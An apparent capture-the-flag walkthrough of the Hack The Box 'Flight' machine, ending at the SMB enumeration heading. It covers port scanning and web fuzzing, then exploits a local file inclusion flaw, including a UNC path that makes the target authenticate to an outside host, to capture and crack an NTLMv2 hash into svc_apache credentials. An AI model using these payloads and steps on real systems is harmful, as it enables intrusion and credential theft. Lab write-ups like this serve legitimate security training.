# Flight

# User Flag

## NMAP Enumeration

All port scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.11.187

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49737/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.11.187 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49737

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-03 20:36:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49737/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-03T20:37:31
|_  start_date: N/A
```

## Website Enumeration

FFuF to fuzz the web url:

```bash
ffuf -c -u http://10.10.11.187/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

images                  [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 87ms]
                        [Status: 200, Size: 7069, Words: 1546, Lines: 155, Duration: 98ms]
Images                  [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 81ms]
css                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 69ms]
js                      [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 162ms]
licenses                [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 92ms]
IMAGES                  [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 102ms]
%20                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 94ms]
*checkout*              [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 238ms]
CSS                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 84ms]
JS                      [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 89ms]
phpmyadmin              [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 163ms]
webalizer               [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 168ms]
*docroot*               [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 161ms]
*                       [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 244ms]
con                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 171ms]
http%3A                 [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 317ms]
**http%3a               [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 85ms]
*http%3A                [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 77ms]
                        [Status: 200, Size: 7069, Words: 1546, Lines: 155, Duration: 80ms]
aux                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 143ms]
**http%3A               [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 134ms]
%C0                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 83ms]
server-status           [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 79ms]
%3FRID%3D2671           [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 89ms]
devinmoore*             [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 127ms]
200109*                 [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 72ms]
*sa_                    [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 87ms]
*dc_                    [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 90ms]
%D8                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 75ms]
%CF                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 78ms]
%CE                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 79ms]
%CD                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 85ms]
%CC                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 88ms]
%CB                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 87ms]
%CA                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 95ms]
%D1                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 92ms]
%D5                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 74ms]
%D4                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 75ms]
%D3                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 77ms]
%D2                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 87ms]
%C2                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 89ms]
%C7                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 90ms]
%C5                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 92ms]
%C3                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 85ms]
%C4                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 90ms]
%D9                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 93ms]
%DE                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 70ms]
%DF                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 73ms]
%DD                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 66ms]
%DB                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 77ms]
%D0                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 353ms]
%D6                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 396ms]
%D7                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 398ms]
%C1                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 402ms]
%C8                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 404ms]
%C9                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 406ms]
%C6                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 391ms]
login%3f                [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 82ms]
%22julie%20roehm%22     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 88ms]
%22james%20kim%22       [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 95ms]
%22britney%20spears%22  [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 93ms]
```

Notes:
* Website is running PHP version 8.1.1.
* Potential usernames found:

```
devinmoore
julie roehm
james kim
britney spears
```

Found an additional virtual host:

```bash
ffuf -u http://flight.htb -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.flight.htb' -fs 7069 -c -t 50

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 380ms]
```

Enumerated new vhost found:

```bash
ffuf -c -u http://school.flight.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

images                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 94ms]
                        [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 540ms]
Images                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 80ms]
styles                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 76ms]
licenses                [Status: 403, Size: 425, Words: 37, Lines: 12, Duration: 70ms]
IMAGES                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 78ms]
%20                     [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 81ms]
*checkout*              [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 74ms]
phpmyadmin              [Status: 403, Size: 425, Words: 37, Lines: 12, Duration: 180ms]
webalizer               [Status: 403, Size: 425, Words: 37, Lines: 12, Duration: 93ms]
Styles                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 601ms]
*docroot*               [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 171ms]
*                       [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 107ms]
con                     [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 241ms]
```

##  Local File Inclusion (LFI)

I found that the URL contains a `view` parameter that disaplyas the selected web page:

```bash
http://school.flight.htb/index.php?view=blog.html
http://school.flight.htb/index.php?view=about.html
http://school.flight.htb/index.php?view=home.html
```

This `view` parameter looks vulnerable to Local File Inclusion (LFI) attacks and after some testing is determined to be exploitable for LFI:

```bash
# returns contents of /etc/hosts
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```

Using responder, we can provide a payload for the target machine to reach out to and capture the hash of the user that the Apache service is running under.

```bash
http://school.flight.htb/index.php?view=//<ip address>/htb
```

We setup responder and get a hash as seen below:

```bash
sudo responder -I tun0 -v

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:93c2cc52effeff54:5A1DE2988EBFD0334AB7BE8E78BEBEBF:0101000000000000801C0B6CC0E5DA01EEBD34ED73BF27BD0000000002000800430042003300340001001E00570049004E002D0042004100570038005A0059005200450052005500500004003400570049004E002D0042004100570038005A005900520045005200550050002E0043004200330034002E004C004F00430041004C000300140043004200330034002E004C004F00430041004C000500140043004200330034002E004C004F00430041004C0007000800801C0B6CC0E5DA01060004000200000008003000300000000000000000000000003000005F6DCC36C79B9F3A483CED4CFCB9D4106FBE5476D55BA3CB59EB4CBC46A429F80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000
```

Used hashcat to crack it:

```bash
hashcat64.exe -m 5600 hash.txt rockyou.txt -o cracked.txt
```

New credentials: `svc_apache:S@Ss!K@*t13`

## Kerberos

Created userlist and tested for potential users but did not find any:

```bash
sudo ./kerbrute_linux_amd64 userenum --dc 10.10.11.187 -d flight.htb -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Flight/userlist
```

## SMB Enumeration

Used the credentials `svc_apache:S@Ss!K@*t13` and enumerated SMB shares with `crackmapexec`:

















